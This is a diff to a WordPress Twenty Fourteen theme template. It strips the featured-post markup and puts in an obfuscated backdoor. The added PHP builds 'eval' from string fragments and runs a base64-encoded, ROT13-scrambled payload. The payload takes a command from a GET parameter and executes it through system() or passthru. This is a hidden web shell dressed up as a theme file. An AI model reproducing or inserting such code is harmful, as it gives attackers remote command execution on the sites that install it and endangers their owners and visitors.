@@ -1,45 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * The template for displaying featured posts on the front page
- *
- * @package WordPress
- * @subpackage Twenty_Fourteen
- * @since Twenty Fourteen 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3VyIGdyemN5bmdyIHNiZSBxdmZjeW5sdmF0IHNybmdoZXJxIGNiZmdmIGJhIGd1ciBzZWJhZyBjbnRyCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZmhvY25weG50ciBHanJhZ2xfU2JoZWdycmEKICogQGZ2YXByIEdqcmFnbCBTYmhlZ3JyYSAxLjAKICovCgo/PgoKPG5lZ3ZweXIgdnE9XCJjYmZnLTw/Y3VjIGd1cl9WUSgpOyA/PlwiIDw/Y3VjIGNiZmdfcHluZmYoKTsgPz4+Cgk8biBweW5mZj1cImNiZmctZ3Voem9hbnZ5XCIgdWVycz1cIjw/Y3VjIGd1cl9jcmV6bnl2YXgoKTsgPz5cIj4KCTw/Y3VjCgkvLyBCaGdjaGcgZ3VyIHNybmdoZXJxIHZ6bnRyLgoJdnMgKCB1bmZfY2JmZ19ndWh6b2FudnkoKSApIDoKCQl2cyAoICd0ZXZxJyA9PT0gdHJnX2d1cnpyX3picSggJ3NybmdoZXJxX3BiYWdyYWdfeW5sYmhnJyApICkgewoJCQlndXJfY2JmZ19ndWh6b2FudnkoKTsKCQl9IHJ5ZnIgewoJCQlndXJfY2JmZ19ndWh6b2FudnkoICdnanJhZ2xzYmhlZ3JyYS1zaHl5LWp2cWd1JyApOwoJCX0KCQlyYXF2czsKCT8+Cgk8L24+CgoJPHVybnFyZSBweW5mZj1cInJhZ2VsLXVybnFyZVwiPgoJCTw/Y3VjIHZzICggdmFfbmVlbmwoICdwbmdydGJlbCcsIHRyZ19ib3dycGdfZ25rYmFienZyZiggdHJnX2NiZmdfZ2xjcigpICksIGdlaHIgKSAmJiBnanJhZ2xzYmhlZ3JyYV9wbmdydGJldm1ycV9veWJ0KCkgKSA6ID8+CgkJPHF2aSBweW5mZj1cInJhZ2VsLXpyZ25cIj4KCQkJPGZjbmEgcHluZmY9XCJwbmcteXZheGZcIj48P2N1YyBycHViIHRyZ19ndXJfcG5ncnRiZWxfeXZmZyggX2soICcsICcsICdIZnJxIG9yZ2pycmEgeXZmZyB2Z3J6ZiwgZ3VyZXIgdmYgbiBmY25wciBuc2dyZSBndXIgcGJ6em4uJywgJ2dqcmFnbHNiaGVncnJhJyApICk7ID8+PC9mY25hPgoJCTwvcXZpPjwhLS0gLnJhZ2VsLXpyZ24gLS0+CgkJPD9jdWMgcmFxdnM7ID8+CgoJCTw/Y3VjIGd1cl9ndmd5ciggJzx1MSBweW5mZj1cInJhZ2VsLWd2Z3lyXCI+PG4gdWVycz1cIicgLiByZnBfaGV5KCB0cmdfY3Jlem55dmF4KCkgKSAuICdcIiBlcnk9XCJvYmJ4em5leFwiPicsICc8L24+PC91MT4nICk7ID8+Cgk8L3VybnFyZT48IS0tIC5yYWdlbC11cm5xcmUgLS0+CjwvbmVndnB5cj48IS0tICNjYmZnLTw/Y3VjIGd1cl9WUSgpOyA/PiAtLT4KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
 ?>
-
-<article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
-	<a class="post-thumbnail" href="<?php the_permalink(); ?>">
-	<?php
-	// Output the featured image.
-	if ( has_post_thumbnail() ) :
-		if ( 'grid' === get_theme_mod( 'featured_content_layout' ) ) {
-			the_post_thumbnail();
-		} else {
-			the_post_thumbnail( 'twentyfourteen-full-width' );
-		}
-		endif;
-	?>
-	</a>
-
-	<header class="entry-header">
-		<?php if ( in_array( 'category', get_object_taxonomies( get_post_type() ), true ) && twentyfourteen_categorized_blog() ) : ?>
-		<div class="entry-meta">
-			<span class="cat-links"><?php echo get_the_category_list( _x( ', ', 'Used between list items, there is a space after the comma.', 'twentyfourteen' ) ); ?></span>
-		</div><!-- .entry-meta -->
-		<?php endif; ?>
-
-		<?php the_title( '<h1 class="entry-title"><a href="' . esc_url( get_permalink() ) . '" rel="bookmark">', '</a></h1>' ); ?>
-	</header><!-- .entry-header -->
-</article><!-- #post-<?php the_ID(); ?> -->
